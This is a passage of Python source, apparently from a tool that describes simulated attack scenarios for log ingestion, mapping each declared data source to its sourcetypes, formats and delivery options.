                'extra_counts':        defn.get('extra_counts', []),
                'identity_fields':     defn.get('identity_fields'),
            }
        return result

    @staticmethod
    def _data_sources(defn):
        """Each declared data source with its formats spelled as wire sourcetypes."""
        from syslog_framing import delivery_description
        from ta_registry import get_ta, wire_metadata
        out = []
        for source in defn.get('data_sources', []):
            ta = get_ta(source['log_type']) or {}
            formats = []
            for fmt in source['formats']:
                sourcetype, wire_source = wire_metadata(source['log_type'], source['sourcetype'], fmt)
                formats.append({'value': fmt, 'sourcetype': sourcetype, 'source': wire_source})
            out.append({
                'log_type': source['log_type'],
                'sourcetype': source['sourcetype'],
                'label': source.get('label') or source['sourcetype'],
                'technology': ta.get('display_name', source['log_type']),
                'formats': formats,
                # An attack over several sourcetypes has one shape, the HEC one,
                # so there is no delivery format to choose.
                'delivery': ({'default': 'uf', 'offered': {d: [] for d in DESTINATION_TYPES}}
                             if spans_several_sources(defn) else delivery_description(ta)),
            })
        return out
